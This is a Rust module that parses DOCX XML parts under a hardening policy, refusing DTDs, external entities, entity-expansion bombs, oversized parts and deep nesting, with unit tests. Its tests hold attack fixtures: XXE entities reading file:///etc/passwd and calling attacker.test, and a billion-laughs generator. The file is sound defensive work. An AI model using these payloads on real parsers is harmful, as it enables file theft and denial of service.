//! The XML policy: the one door every part of a package is parsed through.
//!
//! A DOCX is a zip of XML parts, and every one of them comes from whoever sent the document. The
//! policy is stated once, here, rather than in each walker, so a part cannot be read under weaker
//! rules than its neighbours and a replacement parser cannot silently drop the guarantees:
//!
//! - **No DTD.** A document type declaration is refused, so nothing it declares is in effect.
//! - **No external entity.** A `SYSTEM` or `PUBLIC` identifier anywhere in the declaration —
//!   including the external subset — is refused. No URI and no file path is ever resolved.
//! - **No internal expansion.** The entity declarations are read and their expansion is computed
//!   against a ceiling before the parser is called, so a billion-laughs document is refused rather
//!   than measured.
//! - **Bounded depth and size.** The part may not be larger than [`MAX_XML_BYTES`], may not build
//!   more than [`MAX_XML_NODES`] nodes, and may not nest elements deeper than [`MAX_XML_DEPTH`].
//!
//! `roxmltree` happens to refuse DTDs on its own (`allow_dtd` is `false`), and that is not the
//! guarantee being relied on: the checks above read the bytes, not the parser's opinion, so they
//! still hold if the parser is replaced. The parser is configured with the same bounds as a second
//! line — `nodes_limit` refuses a part before it is materialised, and the depth walk refuses a tree
//! the tokenizer accepted.

use std::collections::HashMap;

use roxmltree::{Document, Node, ParsingOptions};

use crate::parse::ParseError;

/// The largest XML part this reader will parse, in bytes.
///
/// It matches the container's per-part cap (`package::MAX_PART_BYTES`): a part is refused by the
/// zip reader when it decodes past that cap, and refused again here so the policy holds even when
/// bytes reach the parser by another route.
pub const MAX_XML_BYTES: usize = 32 * 1024 * 1024;

/// How deeply elements may nest. OOXML body content reaches ten or so levels; a drawing or a nested
/// content control a handful more. Two hundred and fifty-six is far past anything a producer writes
/// and well short of the stack a nesting bomb is looking for.
pub const MAX_XML_DEPTH: usize = 256;

/// How many nodes one part may build. A document already holds every run it may (200 000), so a
/// part past two million nodes is a generator, not a document.
pub const MAX_XML_NODES: u32 = 2_000_000;

/// How many bytes the internal entities of one DTD may expand to.
///
/// No DTD is accepted today, so no expansion ever happens; the bound exists so the policy survives
/// a parser that does expand entities, and so the reason a billion-laughs document is refused names
/// the expansion rather than the declaration around it.
pub const MAX_ENTITY_EXPANSION: usize = 1024 * 1024;

/// How many entity declarations one internal subset may carry. Past it the subset is refused without
/// being measured, which also bounds the recursion the measurement uses.
pub const MAX_ENTITY_DECLARATIONS: usize = 64;

/// Parses one XML part under the policy, or says which rule refused it.
///
/// This is the only function in the crate that parses XML: every byte that becomes a tree goes
/// through it, so the bounds and the refusals cannot be forgotten by a caller.
pub fn parse<'a>(xml: &'a str, part: &str) -> Result<Document<'a>, ParseError> {
    check(xml).map_err(|refusal| refusal.into_error(part))
}

/// Parses a part under the policy, without naming it: what the unit tests drive.
fn check(xml: &str) -> Result<Document<'_>, Refusal> {
    if xml.len() > MAX_XML_BYTES {
        return Err(Refusal::TooLarge {
            bytes: xml.len(),
            limit: MAX_XML_BYTES,
        });
    }

    // Read before the parse: the reason a DTD is refused should name what it declared, and that is
    // a property of the bytes, not of whichever parser happens to be behind this function.
    if let Some(refusal) = declared_type(xml) {
        return Err(refusal);
    }

    let options = ParsingOptions {
        allow_dtd: false,
        nodes_limit: MAX_XML_NODES,
        entity_resolver: None,
    };

    let document = Document::parse_with_options(xml, options).map_err(|error| match error {
        // A declaration the prologue scan did not see: the parser still refuses it, and the
        // refusal keeps its typed reason.
        roxmltree::Error::DtdDetected => Refusal::Doctype,
        roxmltree::Error::NodesLimitReached => Refusal::TooManyNodes,
        other => Refusal::Malformed(other.to_string()),
    })?;

    let depth = depth_of(&document);

    if depth > MAX_XML_DEPTH {
        return Err(Refusal::TooDeep {
            depth,
            limit: MAX_XML_DEPTH,
        });
    }

    Ok(document)
}

// ---------------------------------------------------------------------------
// Refusals
// ---------------------------------------------------------------------------

/// Why a part did not meet the policy. Each variant is a distinct sentence for the caller, and the
/// two that are about the size of the part map to `limit`; the rest map to `xml_policy`.
#[derive(Debug, Clone, PartialEq, Eq)]
enum Refusal {
    /// A document type declaration is present.
    Doctype,
    /// A document type or an entity names an external identifier.
    ExternalEntity,
    /// The internal entities would expand past [`MAX_ENTITY_EXPANSION`].
    EntityExpansion,
    /// The part is larger than [`MAX_XML_BYTES`].
    TooLarge { bytes: usize, limit: usize },
    /// Elements nest deeper than [`MAX_XML_DEPTH`].
    TooDeep { depth: usize, limit: usize },
    /// The part would build more than [`MAX_XML_NODES`] nodes.
    TooManyNodes,
    /// The part is not well-formed XML.
    Malformed(String),
}

impl Refusal {
    /// Whether this refusal is the part simply being too big, which is the `limit` code rather than
    /// the policy's own.
    fn is_limit(&self) -> bool {
        matches!(
            self,
            Self::TooLarge { .. } | Self::TooDeep { .. } | Self::TooManyNodes
        )
    }

    /// The sentence a host shows its user.
    fn message(&self, part: &str) -> String {
        match self {
            Self::Doctype => format!(
                "{part} declares a document type (DTD); this reader refuses DTDs and expands no entity"
            ),
            Self::ExternalEntity => format!(
                "{part} declares an external entity or document type (SYSTEM/PUBLIC); external entities are refused"
            ),
            Self::EntityExpansion => format!(
                "{part} declares internal entities that expand past the {MAX_ENTITY_EXPANSION}-byte limit"
            ),
            Self::TooLarge { bytes, limit } => {
                format!("{part} is {bytes} bytes, over the {limit}-byte XML limit")
            }
            Self::TooDeep { depth, limit } => {
                format!("{part} nests elements {depth} levels deep, over the {limit}-level limit")
            }
            Self::TooManyNodes => {
                format!("{part} would build more than {MAX_XML_NODES} XML nodes")
            }
            Self::Malformed(reason) => format!("{part} is not valid XML: {reason}"),
        }
    }

    /// The typed error this refusal becomes.
    fn into_error(self, part: &str) -> ParseError {
        let message = self.message(part);

        if self.is_limit() {
            ParseError::Limit(message)
        } else {
            ParseError::XmlPolicy(message)
        }
    }
}

// ---------------------------------------------------------------------------
// The prologue
// ---------------------------------------------------------------------------

/// The refusal the document's prologue announces, if any.
///
/// `<!DOCTYPE` may only sit after the XML declaration, the comments and the processing instructions
/// that precede the root element, so the scan skips exactly those. A scan that cannot make sense of
/// the prologue returns `None`: the parser then reports the malformed XML, which is the right
/// answer for bytes that are not a document at all.
fn declared_type(xml: &str) -> Option<Refusal> {
    let bytes = xml.as_bytes();
    let at = prologue_end(bytes)?;

    if !bytes.get(at..)?.starts_with(b"<!DOCTYPE") {
        return None;
    }

    let end = doctype_end(bytes, at)?;

    Some(classify(xml.get(at..end)?))
}

/// The offset of the first byte after the prolog's declaration, comments and processing
/// instructions.
fn prologue_end(bytes: &[u8]) -> Option<usize> {
    let mut at = 0;

    loop {
        at = skip_spaces(bytes, at);

        let rest = bytes.get(at..)?;

        if rest.starts_with(b"<?") {
            at = after(bytes, at + 2, b"?>")?;
        } else if rest.starts_with(b"<!--") {
            at = after(bytes, at + 4, b"-->")?;
        } else {
            return Some(at);
        }
    }
}

/// The offset just past the first occurrence of `terminator` at or after `from`.
fn after(bytes: &[u8], from: usize, terminator: &[u8]) -> Option<usize> {
    let rest = bytes.get(from..)?;

    rest.windows(terminator.len())
        .position(|window| window == terminator)
        .map(|offset| from + offset + terminator.len())
}

/// The offset just past the `<!DOCTYPE ...>` that starts at `start`, with its internal subset.
///
/// Quoted values and the `[ ... ]` subset are tracked so the closing `>` of an entity declaration is
/// not mistaken for the end of the declaration.
fn doctype_end(bytes: &[u8], start: usize) -> Option<usize> {
    let mut quote: Option<u8> = None;
    let mut subset = 0usize;

    for (offset, byte) in bytes.get(start..)?.iter().enumerate() {
        match *byte {
            b'"' | b'\'' => match quote {
                None => quote = Some(*byte),
                Some(open) if open == *byte => quote = None,
                Some(_) => {}
            },
            b'[' if quote.is_none() => subset = subset.saturating_add(1),
            b']' if quote.is_none() => subset = subset.saturating_sub(1),
            b'>' if quote.is_none() && subset == 0 => return Some(start + offset + 1),
            _ => {}
        }
    }

    None
}

fn skip_spaces(bytes: &[u8], mut at: usize) -> usize {
    while matches!(bytes.get(at), Some(b' ' | b'\t' | b'\r' | b'\n')) {
        at += 1;
    }

    at
}

// ---------------------------------------------------------------------------
// The document type declaration
// ---------------------------------------------------------------------------

/// What one `<!ENTITY` declaration says, as far as the policy needs to know.
enum Entity<'a> {
    /// A `SYSTEM` or `PUBLIC` identifier: an external entity.
    External,
    /// A literal value that may reference other entities.
    Internal { name: &'a str, value: &'a str },
    /// A parameter entity, or a shape the scan does not model. The DTD refusal covers it.
    Other,
}

/// Names the reason this declaration is refused: the worst thing it holds, so a document with both
/// an external entity and a laugh bomb reports the external entity.
fn classify(declaration: &str) -> Refusal {
    let (header, subset) = match declaration.split_once('[') {
        Some((header, subset)) => (header, subset),
        None => (declaration, ""),
    };

    // `<!DOCTYPE name SYSTEM "…">` names an external subset: resolving it would be a fetch.
    if names_external_identifier(header) {
        return Refusal::ExternalEntity;
    }

    let entities = entity_declarations(subset);

    if entities
        .iter()
        .any(|entity| matches!(entity, Entity::External))
    {
        return Refusal::ExternalEntity;
    }

    let mut definitions: Vec<(&str, &str)> = Vec::new();

    for entity in entities {
        if let Entity::Internal { name, value } = entity {
            definitions.push((name, value));
        }
    }

    if definitions.len() > MAX_ENTITY_DECLARATIONS || expands_past_bound(&definitions) {
        return Refusal::EntityExpansion;
    }

    Refusal::Doctype
}

/// The `<!ENTITY` declarations of an internal subset, in order.
fn entity_declarations(subset: &str) -> Vec<Entity<'_>> {
    let mut declarations = Vec::new();
    let mut rest = subset;

    while let Some(start) = rest.find("<!ENTITY") {
        let body = &rest[start + "<!ENTITY".len()..];

        let Some(end) = declaration_end(body) else {
            break;
        };

        declarations.push(classify_entity(&body[..end]));

        if declarations.len() > MAX_ENTITY_DECLARATIONS {
            break;
        }

        rest = &body[end..];
    }

    declarations
}

/// The offset of the `>` that closes a declaration body, skipping quoted values.
fn declaration_end(body: &str) -> Option<usize> {
    let mut quote: Option<char> = None;

    for (offset, character) in body.char_indices() {
        match character {
            '"' | '\'' => match quote {
                None => quote = Some(character),
                Some(open) if open == character => quote = None,
                Some(_) => {}
            },
            '>' if quote.is_none() => return Some(offset),
            _ => {}
        }
    }

    None
}

/// What one declaration body — the text between `<!ENTITY` and its `>` — says.
fn classify_entity(body: &str) -> Entity<'_> {
    let body = body.trim_start();

    // `<!ENTITY % name …>` is a parameter entity: DTD machinery, refused with the DTD.
    if body.starts_with('%') {
        return Entity::Other;
    }

    let name_end = body.find(char::is_whitespace).unwrap_or(body.len());

    let (name, rest) = body.split_at(name_end);
    let rest = rest.trim_start();

    if starts_word(rest, "SYSTEM") || starts_word(rest, "PUBLIC") {
        return Entity::External;
    }

    let Some(value) = quoted(rest) else {
        return Entity::Other;
    };

    Entity::Internal { name, value }
}

/// Whether `text` starts with `word` followed by something that is not part of a name.
fn starts_word(text: &str, word: &str) -> bool {
    match text.strip_prefix(word) {
        Some(after) => !after.starts_with(is_name_character),
        None => false,
    }
}

/// Whether `text` holds `word` as a whole word.
fn contains_word(text: &str, word: &str) -> bool {
    text.match_indices(word).any(|(offset, _)| {
        let before = text[..offset].chars().next_back();
        let after = text[offset + word.len()..].chars().next();

        !before.is_some_and(is_name_character) && !after.is_some_and(is_name_character)
    })
}

/// The characters an XML name is made of, for the word-boundary checks above.
fn is_name_character(character: char) -> bool {
    character.is_alphanumeric() || matches!(character, '-' | '_' | '.' | ':')
}

/// Whether a declaration header names an external identifier.
fn names_external_identifier(header: &str) -> bool {
    contains_word(header, "SYSTEM") || contains_word(header, "PUBLIC")
}

/// The value of a literal that starts at `text`, or `None` when `text` is not one.
fn quoted(text: &str) -> Option<&str> {
    let quote = match text.chars().next()? {
        '"' | '\'' => text.chars().next()?,
        _ => return None,
    };

    let rest = &text[quote.len_utf8()..];
    let end = rest.find(quote)?;

    Some(&rest[..end])
}

// ---------------------------------------------------------------------------
// Entity expansion
// ---------------------------------------------------------------------------

/// Whether the declared entities, expanded the way an XML processor would expand them, pass
/// [`MAX_ENTITY_EXPANSION`].
fn expands_past_bound(definitions: &[(&str, &str)]) -> bool {
    let by_name: HashMap<&str, &str> = definitions.iter().copied().collect();
    let mut memo: HashMap<&str, usize> = HashMap::new();
    let ceiling = MAX_ENTITY_EXPANSION.saturating_add(1);

    definitions.iter().any(|(name, _)| {
        expanded_length(name, &by_name, &mut memo, 0, ceiling) > MAX_ENTITY_EXPANSION
    })
}

/// The length `name` expands to, saturating at `ceiling` so a bomb is measured in one pass rather
/// than expanded. `depth` bounds the recursion, which is what detects a reference loop.
fn expanded_length<'a>(
    name: &'a str,
    definitions: &HashMap<&'a str, &'a str>,
    memo: &mut HashMap<&'a str, usize>,
    depth: usize,
    ceiling: usize,
) -> usize {
    if let Some(length) = memo.get(name) {
        return *length;
    }

    let Some(value) = definitions.get(name).copied() else {
        // A reference to an entity the subset does not declare expands to nothing here; the parser
        // refuses it as unknown, which is a malformed part rather than a policy refusal.
        return 0;
    };

    if depth > MAX_ENTITY_DECLARATIONS {
        return ceiling;
    }

    let mut total = 0usize;
    let mut rest = value;

    while let Some(ampersand) = rest.find('&') {
        total = total.saturating_add(ampersand).min(ceiling);
        rest = &rest[ampersand + 1..];

        let Some(semicolon) = rest.find(';') else {
            total = total.saturating_add(1).min(ceiling);
            rest = "";
            break;
        };

        let reference = &rest[..semicolon];

        let length = match reference.strip_prefix('#') {
            // A character reference is one character.
            Some(_) => 1,
            // An empty reference is not valid XML; the parser says so.
            None if reference.is_empty() => 1,
            None => expanded_length(reference, definitions, memo, depth + 1, ceiling),
        };

        total = total.saturating_add(length).min(ceiling);
        rest = &rest[semicolon + 1..];
    }

    total = total.saturating_add(rest.len()).min(ceiling);
    memo.insert(name, total);

    total
}

// ---------------------------------------------------------------------------
// Depth
// ---------------------------------------------------------------------------

/// The deepest element nesting in the tree, counted with an explicit stack so a deep document
/// cannot exhaust the reader's own.
fn depth_of(document: &Document<'_>) -> usize {
    let mut deepest = 0usize;
    let mut stack = vec![(document.root(), 0usize)];

    while let Some((node, depth)) = stack.pop() {
        deepest = deepest.max(depth);

        for child in node.children().filter(Node::is_element) {
            stack.push((child, depth + 1));
        }
    }

    deepest
}

#[cfg(test)]
mod tests {
    use super::*;

    const VALID: &str = r#"<?xml version="1.0" encoding="UTF-8"?><w:document xmlns:w="http://x"><w:body/></w:document>"#;

    const DOCTYPE: &str = r#"<?xml version="1.0"?>
        <!DOCTYPE document [<!ELEMENT document ANY>]>
        <document/>"#;

    const EXTERNAL_FILE: &str = r#"<?xml version="1.0"?>
        <!DOCTYPE document [<!ENTITY secret SYSTEM "file:///etc/passwd">]>
        <document>&secret;</document>"#;

    const EXTERNAL_URL: &str = r#"<?xml version="1.0"?>
        <!DOCTYPE document [<!ENTITY secret SYSTEM "http://attacker.test/leak">]>
        <document>&secret;</document>"#;

    const EXTERNAL_SUBSET: &str = r#"<?xml version="1.0"?>
        <!DOCTYPE document SYSTEM "http://attacker.test/document.dtd">
        <document/>"#;

    /// Nine levels of ten references each: a billion characters from a few hundred bytes.
    fn billion_laughs() -> String {
        let mut xml = String::from("<?xml version=\"1.0\"?><!DOCTYPE lolz [<!ENTITY lol \"lol\">");

        for level in 1..=9 {
            let previous = if level == 1 {
                "lol".to_owned()
            } else {
                format!("lol{}", level - 1)
            };

            xml.push_str(&format!(
                "<!ENTITY lol{level} \"{}\">",
                format!("&{previous};").repeat(10)
            ));
        }

        xml.push_str("]><lolz>&lol9;</lolz>");

        xml
    }

    #[test]
    fn a_document_without_a_doctype_is_read() {
        let document = check(VALID).unwrap();

        assert_eq!(document.root_element().tag_name().name(), "document");
    }

    #[test]
    fn a_doctype_is_refused() {
        assert_eq!(check(DOCTYPE).unwrap_err(), Refusal::Doctype);
    }

    #[test]
    fn an_external_entity_that_names_a_file_is_refused() {
        assert_eq!(check(EXTERNAL_FILE).unwrap_err(), Refusal::ExternalEntity);
    }

    #[test]
    fn an_external_entity_that_names_a_url_is_refused() {
        assert_eq!(check(EXTERNAL_URL).unwrap_err(), Refusal::ExternalEntity);
    }

    #[test]
    fn an_external_document_type_is_refused() {
        assert_eq!(check(EXTERNAL_SUBSET).unwrap_err(), Refusal::ExternalEntity);
    }

    #[test]
    fn a_billion_laughs_document_is_refused() {
        assert_eq!(
            check(&billion_laughs()).unwrap_err(),
            Refusal::EntityExpansion
        );
    }

    #[test]
    fn a_part_nested_past_the_depth_cap_is_refused() {
        let depth = MAX_XML_DEPTH + 1;
        let xml = format!("{}{}", "<a>".repeat(depth), "</a>".repeat(depth));

        assert_eq!(
            check(&xml).unwrap_err(),
            Refusal::TooDeep {
                depth,
                limit: MAX_XML_DEPTH
            }
        );
    }

    #[test]
    fn a_part_over_the_xml_ceiling_is_refused() {
        let xml = " ".repeat(MAX_XML_BYTES + 1);

        assert_eq!(
            check(&xml).unwrap_err(),
            Refusal::TooLarge {
                bytes: MAX_XML_BYTES + 1,
                limit: MAX_XML_BYTES
            }
        );
    }

    #[test]
    fn a_part_that_is_not_xml_is_malformed() {
        assert!(matches!(check("<a>"), Err(Refusal::Malformed(_))));
    }

    #[test]
    fn a_doctype_behind_a_comment_or_a_declaration_is_still_found() {
        let xml = r#"<?xml version="1.0"?><!-- a note --><?keep going?>
            <!DOCTYPE document><document/>"#;

        assert_eq!(check(xml).unwrap_err(), Refusal::Doctype);
    }

    #[test]
    fn a_word_inside_a_name_is_not_a_system_identifier() {
        let xml = r#"<?xml version="1.0"?><!DOCTYPE MySYSTEM [<!ENTITY x "y">]><MySYSTEM/>"#;

        assert_eq!(check(xml).unwrap_err(), Refusal::Doctype);
    }

    #[test]
    fn an_internal_entity_within_the_bound_is_a_plain_doctype() {
        let xml = r#"<?xml version="1.0"?><!DOCTYPE d [<!ENTITY a "hello"><!ENTITY b "&a; &a;">]><d>&b;</d>"#;

        assert_eq!(check(xml).unwrap_err(), Refusal::Doctype);
    }

    #[test]
    fn an_entity_loop_is_an_expansion_bomb() {
        let xml =
            r#"<?xml version="1.0"?><!DOCTYPE d [<!ENTITY a "&b;"><!ENTITY b "&a;">]><d>&a;</d>"#;

        assert_eq!(check(xml).unwrap_err(), Refusal::EntityExpansion);
    }

    #[test]
    fn the_error_codes_keep_size_and_depth_in_limit() {
        assert!(Refusal::TooDeep { depth: 1, limit: 0 }.is_limit());
        assert!(Refusal::TooLarge { bytes: 1, limit: 0 }.is_limit());
        assert!(Refusal::TooManyNodes.is_limit());
        assert!(!Refusal::Doctype.is_limit());
        assert!(!Refusal::ExternalEntity.is_limit());
        assert!(!Refusal::EntityExpansion.is_limit());
    }

    #[test]
    fn a_policy_refusal_names_the_part_and_the_rule() {
        let error = check(DOCTYPE).unwrap_err().into_error("word/document.xml");

        assert_eq!(error.code(), crate::ffi::TD_ERR_XML_POLICY);
        assert!(error.message().contains("word/document.xml"));
        assert!(error.message().contains("DTD"));
    }
}
